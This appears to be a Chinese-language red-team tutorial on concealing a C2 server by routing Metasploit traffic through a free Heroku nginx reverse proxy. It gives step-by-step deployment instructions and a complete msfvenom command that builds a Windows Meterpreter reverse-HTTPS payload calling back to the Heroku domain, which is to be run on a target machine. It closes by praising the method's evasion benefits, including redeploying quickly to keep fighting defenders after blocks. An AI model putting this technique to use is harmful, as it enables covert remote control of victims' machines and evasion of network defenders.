# 利用heroku隐藏C2服务器
Heroku是一个支持多种编程语言的云平台即服务。简单理解就是可以免费部署docker容器并且可以开放web服务到互联网.下面介绍操作步骤.

- 首先注册Heroku账号，点击通过 [https://dashboard.heroku.com](https://dashboard.heroku.com/) 注册一个账号 (推荐使用gmail)
- 注册成功以后登录，登录以后点击 [部署链接](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku),
- app名称填写为 `mydiydomain` (可自定义,名称为后续域名前缀)，TARGET环境变量填写为C2的handler地址

![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603771065455-e03973a0-8763-4402-8b92-db358f8d0b1f.png#align=left&display=inline&height=488&margin=%5Bobject%20Object%5D&name=image.png&originHeight=976&originWidth=1224&size=76155&status=done&style=none&width=612)

- 然后点击 Deploy app 系统会自动部署.
- 在metasploit-framework中添加handler,配置如图

![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603771665090-ad5c1ecd-c257-44f3-9128-4430183a2e34.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&name=image.png&originHeight=381&originWidth=1334&size=59756&status=done&style=none&width=667)![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603771713694-163331e4-cb96-4bb9-aa79-84980ab9c4ee.png#align=left&display=inline&height=155&margin=%5Bobject%20Object%5D&name=image.png&originHeight=309&originWidth=2281&size=88820&status=done&style=none&width=1140.5)


- 执行 `to_handler` 生成listener
- 使用如下命令生成payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=mydiydomain.herokuapp.com LPORT=443 -f exe -o ~/payload.exe
```

- 上传运行目标机器运行即可
# 运行效果

- 在metasploit-framework中查看session如下,可以看到session的链接地址为heroku中转服务器地址

![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603772048769-0192b120-768f-45ef-986f-4c13d4c1fae4.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=265&originWidth=1737&size=32159&status=done&style=none&width=868.5)

- 在目标机抓包效果如下

![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603772254394-2251f568-89ae-48de-9c55-36b864bbffb0.png#align=left&display=inline&height=33&margin=%5Bobject%20Object%5D&name=image.png&originHeight=66&originWidth=802&size=6382&status=done&style=none&width=401)
![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603772434299-3721e8f1-0eae-4296-b735-a741b20830d8.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=459&originWidth=1612&size=144248&status=done&style=none&width=806)
![image.png](https://cdn.nlark.com/yuque/0/2020/png/159259/1603772464467-3e81edaf-c634-42de-8e79-8ef5091a7c03.png#align=left&display=inline&height=768&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1535&originWidth=1296&size=272442&status=done&style=none&width=648)
# 总结
heroku隐藏C2从技术原理上看非常简单,使用heroku服务部署nginx反向代理服务,payload连接heroku的nginx,nginx将流量转发到C2.具体优势如下:

- 只需要注册heroku免费账号即可
- 无需注册或购买域名
- 自带可信的SSL证书(heroku域名自带证书)
- 如果IP地址被封锁,可删除原有heroku app重新部署heroku app(大约需要30s),与防守人员持续对抗
- 操作步骤简单
